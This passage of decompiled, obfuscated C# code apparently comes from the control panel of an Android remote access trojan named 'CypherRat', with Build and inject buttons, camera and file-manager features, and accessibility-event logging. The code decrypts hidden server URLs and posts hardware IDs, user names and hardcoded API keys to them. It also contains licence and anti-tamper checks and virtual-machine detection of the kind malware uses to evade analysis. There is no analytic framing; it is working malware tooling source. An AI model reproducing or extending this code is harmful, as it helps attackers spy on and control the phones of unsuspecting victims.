				string s = "api=OW4uAboWozh/PF7jAg6Sqw8GwhDjnObglsfiOzKhuz";
				WebRequest webRequest = WebRequest.Create((Module2.smethod_58(string_, "res/icons") + "?USR=[U]&IDF=[I]&IDS=[P]").Replace("[U]", Module2.smethod_58(string_2, "​‍‌‎‏")).Replace("[I]", Module2.smethod_59(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), "Form1")).Replace("[P]", string_0));
				webRequest.Method = "POST";
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = (long)bytes.Length;
				Stream requestStream = webRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				string text = streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				response.Close();
				text = text.Remove(0, 16);
				if (text.StartsWith("1"))
				{
					return new string[]
					{
						"C",
						text.Remove(0, 1)
					};
				}
				if (text.StartsWith("0"))
				{
					return new string[]
					{
						"B",
						text
					};
				}
			}
			catch (Exception)
			{
			}
			return new string[]
			{
				"Error",
				""
			};
		}

		// Token: 0x0600017D RID: 381 RVA: 0x0000D94C File Offset: 0x0000BB4C
		public static string smethod_35()
		{
			string result;
			try
			{
				string s = "api=S0tMeD0WoUQyO8wuButveJYoBlONhU5riAKBPn6R";
				WebRequest webRequest = WebRequest.Create(Module2.smethod_60("I+5lvRdY+D/Rw1X5B3iNFemQswDtFF9gks5KERyI39vjLGwhItChnVJuert5A2gB", "9f9e6q3d5x7v1r2y"));
				webRequest.Method = "POST";
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = (long)bytes.Length;
				Stream requestStream = webRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				string text = streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				response.Close();
				if (!text.StartsWith("K"))
				{
					goto IL_AE;
				}
				result = text.Replace("K:", "");
			}
			catch (Exception)
			{
				goto IL_AE;
			}
			return result;
			IL_AE:
			return null;
		}

		// Token: 0x0600017E RID: 382 RVA: 0x0000DA18 File Offset: 0x0000BC18
		public static Image smethod_36(string string_0)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					NameValueCollection nameValueCollection = new NameValueCollection();
					nameValueCollection.Add("api", "S0tMeD0WoUQyO8wuButveJYoBlONhU5riAKBPn6R");
					XmlDocument xmlDocument = new XmlDocument();
					try
					{
						xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
					}
					catch (Exception ex)
					{
					}
					if (!Module2.smethod_40(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project"), "AngelAndroid_FileManager"))
					{
						Interaction.MsgBox(Module2.smethod_58("vRPM0KvAe2l5ow7/GwxeqrqbxBIoVXSqReiWDDXGYRM=", "File Manager"), MsgBoxStyle.OkOnly, null);
					}
					string value2;
					string string_;
					if (Operators.CompareString(xmlDocument.DocumentElement.Name, Module2.smethod_58("gbgbggvgggtvfvfv", "gffrgtg"), false) == 0)
					{
						XmlElement xmlElement = xmlDocument.FirstChild["P2"];
						XmlElement xmlElement2 = xmlDocument.FirstChild["P4"];
						string value = xmlElement2.FirstChild.Value;
						if (Operators.ConditionalCompareObjectNotEqual(Module2.smethod_58(value, "ZoomPictureBox"), Module2.smethod_3(Application.ExecutablePath), false))
						{
							Interaction.MsgBox(Module2.smethod_58("6PR33ggFwNg/Cx/Ol4q0/muMb85+G7mzi2bGyBqiLj7q1G4i34Y8qqFjTWwBPKJ6sM8Wj+b0GnBg\r\nd6DUvXOMQg==", "Camera Manager"), MsgBoxStyle.OkOnly, null);
							Module2.smethod_1();
							GClass9.cypherRat_0.Home_Btn.Enabled = false;
							GClass9.cypherRat_0.blockbtn.Enabled = false;
							GClass9.cypherRat_0.Connection_btn.Enabled = false;
							GClass9.cypherRat_0.Build_btn.Enabled = false;
							GClass9.cypherRat_0.inject_btn.Enabled = false;
							GClass9.cypherRat_0.Settings_btn.Enabled = false;
							GClass9.string_4 = "a";
							GClass9.string_1 = "v";
							GClass9.cypherRat_0 = new CypherRat();
							GClass9.cypherRat_0.WindowState = FormWindowState.Minimized;
						}
						value2 = xmlElement.FirstChild.Value;
						XmlElement xmlElement3 = xmlDocument.FirstChild["P10"];
						string_ = Module2.smethod_58(xmlElement3.FirstChild.Value, "999");
					}
					if (Operators.CompareString(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), Module2.smethod_58(value2, "​‍‌‎‏"), false) != 0)
					{
						Interaction.MsgBox(Module2.smethod_58("klI0IxCLnJCwukOCUJVZScG58hb6E8uTLNLIZenwPv0=", "IOtigrYWEQAyiFol") + "\r\n" + Module2.smethod_58("TOjQVrBRO7jlOTmWthqZIwp3k/GnVnVnUfLi14snIB/8qQqRi+sWgNroLRLoAFbIGPMmIRFfwGZU\r\neiNdImgRrw==", "TMjiwHlZykdArGgb"), MsgBoxStyle.OkOnly, null);
						Module2.smethod_1();
					}
					string address = (Module2.smethod_58(string_, "res/icons") + "?USR=[U]&IDF=[I]&IDS=[P]&NAM=[N]").Replace("[U]", Module2.smethod_58(value2, "​‍‌‎‏")).Replace("[I]", Module2.smethod_59(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), "Form1")).Replace("[P]", Module4.smethod_5()).Replace("[N]", string_0 + ".png");
					return (Bitmap)Image.FromStream(new MemoryStream(webClient.UploadValues(address, "POST", nameValueCollection)));
				}
			}
			catch (Exception ex2)
			{
			}
			return Module0.not_found;
		}

		// Token: 0x0600017F RID: 383 RVA: 0x0000DD90 File Offset: 0x0000BF90
		public static void smethod_37(string string_0, string string_1)
		{
			if (!Directory.Exists(string_1))
			{
				Directory.CreateDirectory(string_1);
			}
			ZipFile.ExtractToDirectory(string_0, string_1);
		}

		// Token: 0x06000180 RID: 384 RVA: 0x0000DDB8 File Offset: 0x0000BFB8
		public static Image smethod_38(Image image_0, Size size_0, bool bool_0 = false)
		{
			checked
			{
				Image result;
				try
				{
					int width;
					int height;
					if (!bool_0)
					{
						width = size_0.Width;
						height = size_0.Height;
					}
					else
					{
						int width2 = image_0.Width;
						int height2 = image_0.Height;
						float num = (float)size_0.Width / (float)width2;
						float num2 = (float)size_0.Height / (float)height2;
						float num3 = Conversions.ToSingle(Interaction.IIf(num2 < num, num2, num));
						width = (int)Math.Round((double)(unchecked((float)width2 * num3)));
						height = (int)Math.Round((double)(unchecked((float)height2 * num3)));
					}
					Image image = new Bitmap(width, height);
					using (Graphics graphics = Graphics.FromImage(image))
					{
						graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
						graphics.DrawImage(image_0, 0, 0, width, height);
					}
					result = image;
				}
				catch (Exception ex)
				{
					result = image_0;
				}
				return result;
			}
		}

		// Token: 0x06000181 RID: 385 RVA: 0x0000237A File Offset: 0x0000057A
		public static bool smethod_39()
		{
			return true;
		}

		// Token: 0x06000182 RID: 386 RVA: 0x0000DEAC File Offset: 0x0000C0AC
		public static bool smethod_40(object object_4, object object_5)
		{
			int num = 0;
			try
			{
				new CspParameters();
				num = 1;
				return true;
			}
			catch (Exception ex)
			{
				Interaction.MsgBox("Error UnhandledException  , Code x73000015\r\n" + ex.Message + num.ToString(), MsgBoxStyle.OkOnly, null);
			}
			return false;
		}

		// Token: 0x06000183 RID: 387 RVA: 0x0000DF0C File Offset: 0x0000C10C
		public static string smethod_41(IEnumerable<char> chars_0)
		{
			return new string(chars_0.Where((Module2.Class1.func_0 == null) ? (Module2.Class1.func_0 = new Func<char, bool>(Module2.Class1.class1_0.method_0)) : Module2.Class1.func_0).ToArray<char>());
		}

		// Token: 0x06000184 RID: 388 RVA: 0x0000DF50 File Offset: 0x0000C150
		public static string smethod_42(object object_4, object object_5, int int_0)
		{
			string left = "qazwsxedcrfvtgbyhnujmikolp";
			try
			{
				new GClass0();
				string string_ = null;
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(Module2.smethod_58(null, "​‍‌‎‏").Replace("{id}", Module2.smethod_58(string_, "​‍‌‎‏")).Replace("{ids}", Module2.smethod_59(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), "Form1"))));
				httpWebRequest.Method = "GET";
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				string result = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
				httpWebResponse.Close();
				Operators.CompareString(left, "fvtgbyhnujmikolp", false);
				return result;
			}
			catch (Exception)
			{
			}
			return "";
		}

		// Token: 0x06000185 RID: 389 RVA: 0x0000E01C File Offset: 0x0000C21C
		public static object[] smethod_43(byte[] bytes_0, Array array_0)
		{
			object[] array = new object[2];
			MemoryStream memoryStream = new MemoryStream();
			long num = (long)array_0.GetValue(0);
			checked
			{
				memoryStream.Write(bytes_0, 0, (int)num);
				object[] array2 = array;
				int num2 = 0;
				byte[] array3 = memoryStream.ToArray();
				array2[num2] = Module2.smethod_27(ref array3);
				memoryStream.Dispose();
				memoryStream = new MemoryStream();
				long num3 = (long)array_0.GetValue(1);
				memoryStream.Write(bytes_0, (int)num, (int)num3);
				object[] array4 = array;
				int num4 = 1;
				array3 = memoryStream.ToArray();
				array4[num4] = Module2.smethod_27(ref array3);
				memoryStream.Dispose();
				return array;
			}
		}

		// Token: 0x06000186 RID: 390 RVA: 0x0000E0A0 File Offset: 0x0000C2A0
		public static string smethod_44(string string_0)
		{
			return Encoding.UTF8.GetString(Convert.FromBase64String(string_0));
		}

		// Token: 0x06000187 RID: 391 RVA: 0x0000237A File Offset: 0x0000057A
		public static bool smethod_45()
		{
			return true;
		}

		// Token: 0x06000188 RID: 392 RVA: 0x0000E0C0 File Offset: 0x0000C2C0
		public static Point smethod_46(object form_0, object form_1)
		{
			checked
			{
				int num = form_0.Location.X + (int)Math.Round((double)form_0.Width / 2.0) - (int)Math.Round((double)form_1.Width / 2.0);
				int num2 = form_0.Location.Y + (int)Math.Round((double)form_0.Height / 2.0) - (int)Math.Round((double)form_1.Height / 2.0);
				if (num < 0)
				{
					num = 0;
				}
				if (num2 < 0)
				{
					num2 = 0;
				}
				if (num > Screen.PrimaryScreen.WorkingArea.Size.Width - form_1.Size.Width)
				{
					num = Screen.PrimaryScreen.WorkingArea.Size.Width - form_1.Size.Width;
				}
				if (num2 > Screen.PrimaryScreen.WorkingArea.Size.Height - form_1.Size.Height)
				{
					num2 = Screen.PrimaryScreen.WorkingArea.Size.Height - form_1.Size.Height;
				}
				Point result = new Point(num, num2);
				return result;
			}
		}

		// Token: 0x06000189 RID: 393 RVA: 0x0000E220 File Offset: 0x0000C420
		public static Array smethod_47(long long_2)
		{
			long num = 1024L;
			long num2 = 1048576L;
			long num3 = 1073741824L;
			long num4 = 1099511627776L;
			string text = "0 Bytes";
			if (long_2 >= 1024L)
			{
				if (long_2 <= num4)
				{
					if (long_2 <= num3)
					{
						if (long_2 <= num2)
						{
							if (long_2 >= num)
							{
								text = ((double)long_2 / (double)num).ToString("0.00") + " KB";
							}
						}
						else
						{
							text = ((double)long_2 / (double)num / (double)num).ToString("0.00") + " MB";
						}
					}
					else
					{
						text = ((double)long_2 / (double)num / (double)num / (double)num).ToString("0.00") + " GB";
					}
				}
				else
				{
					text = ((double)long_2 / (double)num / (double)num / (double)num / (double)num).ToString("0.00") + " TB";
				}
			}
			else
			{
				text = Conversions.ToString(long_2) + " Bytes";
			}
			return new string[]
			{
				text.ToString()
			};
		}

		// Token: 0x0600018A RID: 394 RVA: 0x0000E358 File Offset: 0x0000C558
		public static Array smethod_48(long long_0, long long_1)
		{
			checked
			{
				Array result;
				try
				{
					if (Module2.staticLocalInitFlag_0 == null)
					{
						Interlocked.CompareExchange<StaticLocalInitFlag>(ref Module2.staticLocalInitFlag_0, new StaticLocalInitFlag(), null);
					}
					bool flag = false;
					try
					{
						Monitor.Enter(Module2.staticLocalInitFlag_0, ref flag);
						if (Module2.staticLocalInitFlag_0.State != 0)
						{
							if (Module2.staticLocalInitFlag_0.State == 2)
							{
								throw new IncompleteInitialization();
							}
						}
						else
						{
							Module2.staticLocalInitFlag_0.State = 2;
							Module2.long_0 = long_0;
						}
					}
					finally
					{
						Module2.staticLocalInitFlag_0.State = 1;
						if (flag)
						{
							Monitor.Exit(Module2.staticLocalInitFlag_0);
						}
					}
					if (Module2.staticLocalInitFlag_1 == null)
					{
						Interlocked.CompareExchange<StaticLocalInitFlag>(ref Module2.staticLocalInitFlag_1, new StaticLocalInitFlag(), null);
					}
					bool flag2 = false;
					try
					{
						Monitor.Enter(Module2.staticLocalInitFlag_1, ref flag2);
						if (Module2.staticLocalInitFlag_1.State == 0)
						{
							Module2.staticLocalInitFlag_1.State = 2;
							Module2.long_1 = long_1;
						}
						else if (Module2.staticLocalInitFlag_1.State == 2)
						{
							throw new IncompleteInitialization();
						}
					}
					finally
					{
						Module2.staticLocalInitFlag_1.State = 1;
						if (flag2)
						{
							Monitor.Exit(Module2.staticLocalInitFlag_1);
						}
					}
					long num = long_0 - Module2.long_0;
					long num2 = long_1 - Module2.long_1;
					Module2.long_0 = long_0;
					Module2.long_1 = long_1;
					result = new object[]
					{
						Module2.smethod_47((num2 >= 0L) ? num2 : 0L).GetValue(0),
						Module2.smethod_47((num < 0L) ? 0L : num).GetValue(0)
					};
				}
				catch (Exception ex)
				{
					result = new string[]
					{
						"n/a",
						"n/a"
					};
				}
				return result;
			}
		}

		// Token: 0x0600018B RID: 395 RVA: 0x0000E534 File Offset: 0x0000C734
		public static byte[] smethod_49(byte[] bytes_0, string string_0)
		{
			MemoryStream memoryStream = new MemoryStream();
			checked
			{
				using (MemoryStream memoryStream2 = new MemoryStream(bytes_0))
				{
					RijndaelManaged rijndaelManaged = Module2.smethod_50(string_0);
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream2, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read))
					{
						byte[] buffer = new byte[(int)(memoryStream2.Length - 1L) + 1];
						int count = cryptoStream.Read(buffer, 0, (int)memoryStream2.Length);
						memoryStream.Write(buffer, 0, count);
					}
				}
				return memoryStream.ToArray();
			}
		}

		// Token: 0x0600018C RID: 396 RVA: 0x0000E5E4 File Offset: 0x0000C7E4
		private static RijndaelManaged smethod_50(string string_0)
		{
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(string_0, Encoding.Unicode.GetBytes("xy7h8842n61q50xf2x"));
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			checked
			{
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.BlockSize / 8.0));
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.KeySize / 8.0));
				rijndaelManaged.Padding = PaddingMode.PKCS7;
				return rijndaelManaged;
			}
		}

		// Token: 0x0600018D RID: 397 RVA: 0x0000E668 File Offset: 0x0000C868
		public static byte[] smethod_51(string string_0, byte[] bytes_0)
		{
			MemoryStream memoryStream = new MemoryStream();
			byte[] array = Module2.smethod_23(bytes_0);
			byte[] array2 = Module2.smethod_23(Module2.smethod_9().GetBytes(string_0));
			byte[] bytes = Module2.smethod_9().GetBytes(Conversions.ToString(array2.Length));
			byte[] bytes2 = Module2.smethod_9().GetBytes("\0");
			byte[] bytes3 = Module2.smethod_9().GetBytes(Conversions.ToString(array.Length));
			memoryStream.Write(bytes, 0, bytes.Length);
			memoryStream.Write(bytes2, 0, bytes2.Length);
			memoryStream.Write(bytes3, 0, bytes3.Length);
			memoryStream.Write(bytes2, 0, bytes2.Length);
			memoryStream.Write(array2, 0, array2.Length);
			memoryStream.Write(array, 0, array.Length);
			byte[] result = memoryStream.ToArray();
			memoryStream.Dispose();
			return result;
		}

		// Token: 0x0600018E RID: 398 RVA: 0x0000E728 File Offset: 0x0000C928
		public static string[] smethod_52(string string_0)
		{
			string text = "time=";
			string text2 = "packet loss";
			try
			{
				string text3 = string_0.ToLower();
				if (!text3.Contains(text))
				{
					text = "0";
				}
				else
				{
					object objectValue = RuntimeHelpers.GetObjectValue(text3.ToLower().Split(new string[]
					{
						text
					}, StringSplitOptions.None).GetValue(1));
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, "Split", new object[]
					{
						new string[]
						{
							"ms"
						},
						StringSplitOptions.None
					}, null, null, null), null, "GetValue", new object[]
					{
						0
					}, null, null, null));
					text = Conversions.ToString(objectValue2).Trim();
				}
				if (text3.Contains(text2))
				{
					object objectValue3 = RuntimeHelpers.GetObjectValue(text3.Split(new string[]
					{
						text2
					}, StringSplitOptions.None).GetValue(0));
					object[] array = (object[])NewLateBinding.LateGet(objectValue3, null, "Split", new object[]
					{
						new string[]
						{
							","
						},
						StringSplitOptions.None
					}, null, null, null);
					text2 = Conversions.ToString(array.GetValue(checked(array.Length - 1)));
				}
			}
			catch (Exception ex)
			{
				return new string[]
				{
					"",
					""
				};
			}
			string[] result;
			if (Operators.CompareString(text2, "packet loss", false) == 0)
			{
				result = new string[]
				{
					"",
					""
				};
			}
			else
			{
				result = new string[]
				{
					text.Trim(),
					text2.Trim()
				};
			}
			return result;
		}

		// Token: 0x0600018F RID: 399 RVA: 0x0000E8E0 File Offset: 0x0000CAE0
		public static string smethod_53()
		{
			try
			{
				string hostName = Dns.GetHostName();
				foreach (IPAddress ipaddress in Dns.GetHostEntry(hostName).AddressList)
				{
					if (ipaddress.ToString().StartsWith("192.168.1."))
					{
						return ipaddress.ToString();
					}
				}
			}
			catch (Exception ex)
			{
			}
			return "127.0.0.1";
		}

		// Token: 0x06000190 RID: 400 RVA: 0x0000E960 File Offset: 0x0000CB60
		public static int smethod_54(int int_0, int int_1)
		{
			int result;
			try
			{
				if (int_1 != 0)
				{
					result = checked((int)Math.Round(unchecked((double)int_0 / (double)int_1 * 100.0)));
				}
				else
				{
					result = 0;
				}
			}
			catch (Exception ex)
			{
				result = 0;
			}
			return result;
		}

		// Token: 0x06000191 RID: 401 RVA: 0x0000E9B4 File Offset: 0x0000CBB4
		public static string smethod_55(int int_0)
		{
			string result;
			switch (int_0)
			{
			case 0:
				result = "CLICKED";
				break;
			case 1:
				result = "FOCUSED";
				break;
			case 2:
				result = "LONG CLICKED";
				break;
			case 3:
				result = "TEXT";
				break;
			case 4:
				result = "NOTIFICATION";
				break;
			case 5:
				result = "WINDOW CHANGED";
				break;
			default:
				result = "n/a";
				break;
			}
			return result;
		}

		// Token: 0x06000192 RID: 402
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern Module2.EXECUTION_STATE SetThreadExecutionState(Module2.EXECUTION_STATE esFlags);

		// Token: 0x06000193 RID: 403 RVA: 0x0000EA18 File Offset: 0x0000CC18
		private static Module2.EXECUTION_STATE smethod_56()
		{
			return Module2.SetThreadExecutionState((Module2.EXECUTION_STATE)(-2147483645));
		}

		// Token: 0x06000194 RID: 404 RVA: 0x0000237D File Offset: 0x0000057D
		public static void smethod_57()
		{
			Module2.smethod_56();
		}

		// Token: 0x06000195 RID: 405 RVA: 0x0000EA34 File Offset: 0x0000CC34
		public static string smethod_58(string string_0, string string_1)
		{
			string result;
			try
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] array = new byte[32];
				byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_1));
				Array.Copy(sourceArray, 0, array, 0, 16);
				Array.Copy(sourceArray, 0, array, 15, 16);
				rijndaelManaged.Key = array;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array2 = Convert.FromBase64String(string_0);
				string @string = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
				result = @string;
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000196 RID: 406 RVA: 0x0000EAF0 File Offset: 0x0000CCF0
		public static string smethod_59(string string_0, string string_1)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = new byte[32];
			byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_1));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			byte[] bytes = Encoding.ASCII.GetBytes(string_0);
			return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
		}

		// Token: 0x06000197 RID: 407 RVA: 0x0000EB84 File Offset: 0x0000CD84
		public static string smethod_60(string string_0, string string_1)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			new MD5CryptoServiceProvider();
			ASCIIEncoding asciiencoding = new ASCIIEncoding();
			byte[] bytes = asciiencoding.GetBytes(string_1);
			try
			{
				rijndaelManaged.Key = bytes;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array = Convert.FromBase64String(string_0);
				return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
			}
			catch (Exception ex)
			{
			}
			return "";
		}

		// Token: 0x06000198 RID: 408 RVA: 0x0000EC18 File Offset: 0x0000CE18
		public static bool smethod_61()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					try
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							string text = managementBaseObject["Manufacturer"].ToString().ToLower();
							if ((Operators.CompareString(text, "microsoft corporation", false) == 0 && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || Operators.CompareString(managementBaseObject["Model"].ToString(), "VirtualBox", false) == 0)
							{
								return true;
							}
						}
					}
					finally
					{
						ManagementObjectCollection.ManagementObjectEnumerator enumerator;
						if (enumerator != null)
						{
							((IDisposable)enumerator).Dispose();
						}
					}
				}
			}
			return false;
		}

		// Token: 0x06000199 RID: 409 RVA: 0x0000ED28 File Offset: 0x0000CF28
		internal static string smethod_62(string string_0, int int_0, object object_5)
		{
			try
			{
				try
				{
					object_5 = RuntimeHelpers.GetObjectValue(new object());
				}
				catch (Exception ex)
				{
					Interaction.MsgBox("Unable to connect to server...", MsgBoxStyle.OkOnly, null);
					Environment.Exit(0);
				}
				if (string_0.Length > 2)
				{
					try
					{
						Thread.Sleep(3000);
						XmlDocument xmlDocument = new XmlDocument();
						try
						{
							xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
						}
						catch (Exception ex2)
						{
							Interaction.MsgBox(Module2.smethod_58("m5vHCLhy7EmU9t9wKTtdQDrex1iJN65VcCE39srTo3I=", "Int"), MsgBoxStyle.OkOnly, null);
							Environment.Exit(0);
						}
						XmlElement xmlElement = xmlDocument.FirstChild["P6"];
						string string_ = Module2.smethod_58(xmlElement.FirstChild.Value, "IO.String");
						string text2;
						do
						{
							try
							{
								HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(Module2.smethod_58(string_, "Build")));
								httpWebRequest.Method = "GET";
								httpWebRequest.Timeout = 50;
								HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
								StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
								string text = streamReader.ReadToEnd();
								httpWebResponse.Close();
								if (text.Contains("ok"))
								{
								}
							}
							catch (Exception ex3)
							{
							}
							text2 = "aQkweoEMlSHj8LhEpHBMGoop";
						}
						while (text2.Length <= 0);
						string text4;
						do
						{
							try
							{
								HttpWebRequest httpWebRequest2 = (HttpWebRequest)WebRequest.Create(new Uri(Module2.smethod_58(string_, "Build")));
								httpWebRequest2.Method = "GET";
								httpWebRequest2.Timeout = 50;
								HttpWebResponse httpWebResponse2 = (HttpWebResponse)httpWebRequest2.GetResponse();
								StreamReader streamReader2 = new StreamReader(httpWebResponse2.GetResponseStream());
								string text3 = streamReader2.ReadToEnd();
								httpWebResponse2.Close();
								if (text3.Contains("ok"))
								{
								}
							}
							catch (Exception ex4)
							{
							}
							text4 = "ywDP2ZZuaoEKrnw2yDuZz";
						}
						while (text4.Length <= 0);
						string text6;
						do
						{
							try
							{
								HttpWebRequest httpWebRequest3 = (HttpWebRequest)WebRequest.Create(new Uri(Module2.smethod_58("Q1QE8fnqw3Ne45OJRXiVAjELwyqVFW8XwklDZ4ZRtBE=", "Build")));
								httpWebRequest3.Method = "GET";
								httpWebRequest3.Timeout = 50;
								HttpWebResponse httpWebResponse3 = (HttpWebResponse)httpWebRequest3.GetResponse();
								StreamReader streamReader3 = new StreamReader(httpWebResponse3.GetResponseStream());
								string text5 = streamReader3.ReadToEnd();
								httpWebResponse3.Close();
								if (text5.Contains("ok"))
								{
								}
							}
							catch (Exception ex5)
							{
							}
							text6 = "RIzoj94cY3VxK/7qxW2hBBrC22M4CVMB";
						}
						while (text6.Length <= 0);
						string text7;
						do
						{
							text7 = "jB5T7eSEblsUPNFOKvpWG3DEgaPeqj7rtMBn";
						}
						while (text7.Length <= 0);
						string text8;
						do
						{
							try
							{
								Module2.smethod_65("TVqvvTFTYckcXjtdyfUHbjkbJKlknlk==");
							}
							catch (Exception ex6)
							{
							}
							text8 = "basopQqiDlGHRbKNbh0dcYCPYXE5qDE+k/Ie";
						}
						while (text8.Length <= 0);
						string text10;
						do
						{
							try
							{
								HttpWebRequest httpWebRequest4 = (HttpWebRequest)WebRequest.Create(new Uri(Module2.smethod_58("REVTOhVRU6x8ZcSnBjr6/0EdXeMNXaKP42CXTNzKBtY=", Module2.smethod_64())));
								httpWebRequest4.Method = "GET";
								httpWebRequest4.Timeout = Math.Max(1000, 1000);
								HttpWebResponse httpWebResponse4 = (HttpWebResponse)httpWebRequest4.GetResponse();
								StreamReader streamReader4 = new StreamReader(httpWebResponse4.GetResponseStream());
								string text9 = streamReader4.ReadToEnd();
								httpWebResponse4.Close();
								if (text9.Contains("ok"))
								{
								}
							}
							catch (Exception ex7)
							{
							}
							text10 = "8wcL1UgwTI8nQlp4NXjkudC9/0NmPI+rJ";
						}
						while (text10.Length <= 0);
						string text11;
						do
						{
							text11 = "ZBlSzn6nBOtAKlwZrQtPFpOYrxQ";
						}
						while (text11.Length <= 0);
						string_0 = Module2.smethod_42(RuntimeHelpers.GetObjectValue(object_5), string_0, int_0);
						Thread.Sleep(3000);
					}
					catch (Exception ex8)
					{
					}
				}
			}
			catch (Exception ex9)
			{
			}
			return "Unable to connect to server...";
		}

		// Token: 0x0600019A RID: 410 RVA: 0x0000F208 File Offset: 0x0000D408
		public static string smethod_63(object object_4, object object_5, int int_0)
		{
			try
			{
				GClass0 gclass = new GClass0();
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(Module2.smethod_58("wQoUsYGtPocCwl/yLq7pmyhDzxswCsM8ZAyghlS5lnq5WuvfA0rGiUQcnsloPNNTUoGMstqeA2Sq\r\nd8Esf77K5sFOuaRFtkH4ICiK7QhAG1o=", "​‍‌‎‏").Replace("{id}", Module2.smethod_58("iE3FA9ors/i996rwve77dg==", "​‍‌‎‏")).Replace("{ids}", Module2.smethod_59(Environment.UserName + "~" + gclass.method_2("C"), "Form1"))));
				httpWebRequest.Timeout = (Module8.smethod_3() ? 100 : 150);
				httpWebRequest.Method = "GET";
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				string result = streamReader.ReadToEnd();
				httpWebResponse.Close();
				return result;
			}
			catch (Exception ex)
			{
			}
			return "";
		}

		// Token: 0x0600019B RID: 411 RVA: 0x0000F2FC File Offset: 0x0000D4FC
		private static string smethod_64()
		{
			string result;
			try
			{
				result = Module2.smethod_58("Scan Data", Module2.smethod_42(RuntimeHelpers.GetObjectValue(new object()), "Cr5Jn1gMhvoJwhHZSOo4UA==", 154965));
			}
			catch (Exception ex)
			{
				result = "Build";
			}
			return result;
		}

		// Token: 0x0600019C RID: 412 RVA: 0x0000F358 File Offset: 0x0000D558
		private static void smethod_65(string string_0)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(Module2.smethod_58("nAEZZLUbubEiY/axU7d0zHtdog2b/PAVzK9692", "Build")));
				httpWebRequest.Method = "GET";
				httpWebRequest.Timeout = Math.Max(1000, 1000);
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				string text = streamReader.ReadToEnd();
				httpWebResponse.Close();
				if (text.Contains(string_0))
				{
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x04000048 RID: 72
